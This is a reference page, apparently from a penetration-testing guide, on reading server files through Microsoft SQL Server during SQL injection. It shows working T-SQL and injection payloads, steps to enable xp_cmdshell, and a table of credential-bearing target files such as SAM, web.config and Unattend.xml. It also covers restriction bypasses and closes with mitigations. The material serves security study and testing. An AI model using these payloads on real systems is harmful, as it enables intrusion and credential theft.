---
title: Reading Files
description: Techniques for reading files from the filesystem using MSSQL
category: File Operations
order: 19
tags: ["file operations", "openrowset", "bulk", "xp_cmdshell"]
lastUpdated: 2026-10-08
---

Microsoft SQL Server provides several methods to read files from the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.

`OPENROWSET(BULK ...)`, `xp_fileexist` and `xp_dirtree` work on both Windows and SQL Server for Linux (use the server's native path syntax). `xp_cmdshell` and OLE Automation are Windows-only — they are not supported on SQL Server for Linux. The Windows paths used in the examples are illustrative; on Linux, target paths such as `/var/opt/mssql/...` or `/etc/...`.

## Prerequisites

To read files from MSSQL, you typically need one of the following:

1. `sysadmin` role membership for `xp_cmdshell` (or an `EXECUTE` grant on it with a `##xp_cmdshell_proxy_account##` credential)
2. For OPENROWSET BULK on Windows, `ADMINISTER BULK OPERATIONS` (or `ADMINISTER DATABASE BULK OPERATIONS`); files are read as the SQL Server service account for SQL logins and with the caller's own Windows account for Windows logins. On Linux it takes `sysadmin` in practice: SQL Server 2017 and 2019 reject the permission and the `bulkadmin` role ("not supported on the 'Linux' platform"), and 2022 accepts them, but a non-sysadmin login still could not read files that `sysadmin` could (tested on 2022 CU27)
3. Ad hoc distributed queries enabled (for some OPENROWSET methods)

## OPENROWSET BULK

The most versatile method for reading files. Reads file contents directly into a result set.

### Reading Text Files

```sql
-- Read entire file as single text value (SINGLE_CLOB for ASCII)
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;

-- Read as Unicode text (SINGLE_NCLOB)
SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_NCLOB) AS Contents;
```

### Reading Binary Files

```sql
-- Read binary file (SINGLE_BLOB)
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\config\SAM', SINGLE_BLOB) AS Contents;

-- Convert to hex for display
SELECT CONVERT(VARCHAR(MAX), BulkColumn, 2)
FROM OPENROWSET(BULK 'C:\path\to\binary', SINGLE_BLOB) AS Contents;
```

### OPENROWSET BULK Options

| Option       | Description                          | Use Case           |
| ------------ | ------------------------------------ | ------------------ |
| SINGLE_CLOB  | ASCII text, single row/column        | Config files, logs |
| SINGLE_NCLOB | Unicode text, single row/column      | Unicode files      |
| SINGLE_BLOB  | Binary data, single row/column       | Executables, SAM   |
| FORMATFILE   | Custom format for structured parsing | CSV, fixed-width   |

## Using xp_cmdshell

When `xp_cmdshell` is enabled, use OS commands to read files:

```sql
-- Read file using 'type' command
EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts';

-- Read with PowerShell (more flexible)
EXEC xp_cmdshell 'powershell -c "Get-Content C:\inetpub\wwwroot\web.config"';

-- Base64 encode for binary files
EXEC xp_cmdshell 'powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes(''C:\path\to\file''))"';
```

### Enabling xp_cmdshell

```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

## File System Functions

### xp_fileexist - Check File Existence

```sql
-- Returns 1 if file exists, 0 otherwise
DECLARE @exists INT;
EXEC xp_fileexist 'C:\Windows\System32\drivers\etc\hosts', @exists OUTPUT;
SELECT @exists;

-- Alternative: returns result set with file/directory info
EXEC xp_fileexist 'C:\Windows\System32\drivers\etc\hosts';
```

### xp_dirtree - List Directory Contents

```sql
-- List files and subdirectories
EXEC xp_dirtree 'C:\inetpub\wwwroot\', 1, 1;

-- Parameters: path, depth (1=immediate), include files (1=yes)
-- Returns: subdirectory, depth, file (0=dir, 1=file)

-- Store results in table for querying
CREATE TABLE #dirs (subdirectory VARCHAR(255), depth INT, isfile INT);
INSERT INTO #dirs EXEC xp_dirtree 'C:\inetpub\wwwroot\', 1, 1;
SELECT * FROM #dirs WHERE isfile = 1;
```

## OLE Automation (sp_OACreate)

Use FileSystemObject for file operations. It is off by default and Windows-only (on Linux, enabling `Ole Automation Procedures` fails with Msg 15392), and calling `sp_OACreate` needs `sysadmin` or an explicit `EXECUTE` grant on it.

```sql
-- Enable OLE Automation
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Read file using FileSystemObject
DECLARE @fso INT, @file INT, @content VARCHAR(8000);
EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUTPUT;
EXEC sp_OAMethod @fso, 'OpenTextFile', @file OUTPUT, 'C:\Windows\System32\drivers\etc\hosts', 1;
EXEC sp_OAMethod @file, 'ReadAll', @content OUTPUT;
SELECT @content;
EXEC sp_OADestroy @file;
EXEC sp_OADestroy @fso;
```

## Important Target Files

| File Path                                                                                    | Description                         |
| -------------------------------------------------------------------------------------------- | ----------------------------------- |
| `C:\Windows\System32\drivers\etc\hosts`                                                      | Host mappings                       |
| `C:\Windows\System32\config\SAM`                                                             | User account database               |
| `C:\inetpub\wwwroot\web.config`                                                              | IIS/ASP.NET configuration           |
| `C:\inetpub\wwwroot\*\connectionstrings.config`                                              | Database connection strings         |
| `C:\Windows\Panther\Unattend.xml`                                                            | Unattended install (may have creds) |
| `C:\Windows\Panther\unattend\Unattend.xml`                                                   | Alternative unattend location       |
| `C:\Windows\System32\inetsrv\config\applicationHost.config`                                  | IIS config                          |
| `C:\Windows\Microsoft.NET\Framework64\*\Config\web.config`                                   | .NET machine config                 |
| `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` | PowerShell history                  |

**Path variability:** Paths with `*` are wildcards requiring enumeration. Actual paths vary by version:

- **.NET Framework:** `v4.0.30319`, `v2.0.50727`, etc. — check `C:\Windows\Microsoft.NET\Framework64\` for installed versions
- **IIS config:** May be at `%systemroot%\System32\inetsrv\config\` (IIS 7+) or `%systemroot%\system32\inetsrv\MetaBase.xml` (IIS 6)
- **User profiles:** Replace `*` with discovered usernames from `C:\Users\` directory listing
- **Web roots:** Custom IIS sites may use paths other than `C:\inetpub\wwwroot\`

Verify paths on the target system using directory listing (`xp_dirtree`, `xp_cmdshell 'dir'`) before attempting file reads.

## SQL Injection Examples

```sql
-- Read file via UNION injection (string context, 3-column query, column 2 is displayed)
' UNION SELECT NULL, BulkColumn, NULL FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x--

-- Check file existence via stacked query (time-based; fires even if the WHERE matches no row)
'; DECLARE @x INT; EXEC xp_fileexist 'C:\inetpub\wwwroot\web.config', @x OUTPUT; IF @x=1 WAITFOR DELAY '0:0:5'--

-- Stacked query to read file (returns a second result set; only useful if the application reads it)
'; SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x--

-- Using xp_cmdshell in injection
'; EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config'--
```

## Checking Permissions

```sql
-- Check if user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Check if BULK operations allowed
SELECT HAS_PERMS_BY_NAME(null, null, 'ADMINISTER BULK OPERATIONS');

-- Check if xp_cmdshell is enabled
EXEC sp_configure 'xp_cmdshell';

-- Check if OLE Automation is enabled
EXEC sp_configure 'Ole Automation Procedures';
```

## Bypassing Restrictions

### When OPENROWSET BULK is Blocked

```sql
-- Try using xp_cmdshell instead
EXEC xp_cmdshell 'type "C:\path\to\file"';

-- Or OLE Automation
DECLARE @fso INT, @file INT, @line VARCHAR(8000);
EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUTPUT;
-- ...
```

### Reading Files as Different User

```sql
-- Use EXECUTE AS to impersonate (if permitted)
EXECUTE AS LOGIN = 'sa';
SELECT * FROM OPENROWSET(BULK 'C:\sensitive\file.txt', SINGLE_CLOB) AS x;
REVERT;
```

Impersonating a login requires `IMPERSONATE` permission on it; impersonating `sa` effectively requires `CONTROL SERVER` (sysadmin), so this helps only when you already hold a login that can impersonate a higher-privileged one.

## Mitigation

To prevent unauthorized file reading:

1. Restrict `sysadmin` role membership
2. Disable `xp_cmdshell` and `Ole Automation Procedures` if not needed
3. Disable ad hoc distributed queries
4. Use parameterized queries in applications
5. Apply principle of least privilege to SQL Server service account
6. Monitor for OPENROWSET BULK usage in query logs
